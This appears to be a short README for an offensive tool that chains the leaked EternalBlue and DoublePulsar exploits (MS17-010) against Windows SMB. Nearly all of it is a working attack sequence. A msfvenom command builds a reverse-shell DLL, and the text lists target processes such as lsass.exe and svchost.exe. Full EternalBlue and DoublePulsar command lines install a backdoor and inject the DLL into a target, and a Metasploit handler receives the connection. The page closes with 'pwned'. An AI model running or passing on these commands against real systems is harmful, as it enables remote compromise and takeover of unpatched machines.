# Eternal-pulsar (ms17-010)

Eternalblue-Doublepulsar without Metasploit and Python <br> 
base on shadowbroker's exploit (fuzzbunch)
- you can run it on windows or linux (need wine)


### Create payload with msfveom (staged)

` msfvenom -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f dll >  shell.dll`

you can also use other payloads <b>windows/shell_reverse_tcp</b> (stageless), <b>windows/meterpreter/reverse_tcp</b>

### ProcessName list to inject
`lsass.exe (x64)` <br>
`wlms.exe  (x86) `<br>
`svchost.exe ` <br>
`explorer.exe `<br>
`spoolsv.exe `<br>

### EternalBlue & Doublepulsar  (--help )

[help.txt](https://github.com/sailay1996/eternal-pulsar/blob/master/help.txt)


### Backdoor Install with EternalBlue 

` Eternalblue-2.2.0.exe --TargetIp 10.10.10.10 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 - -GroomAllocations 12 --OutConfig 1.txt`


### Sending shellcode to inject DLL with Doublepulsar 

` Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 10.10.10.10 --TargetPort 445 --DllPayload shell.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll`


### multi/handler listening with msf

` msfconsole -q -r msfhandler.rc`

#### pwned !!!


#### [@404death](https://twitter.com/404death)
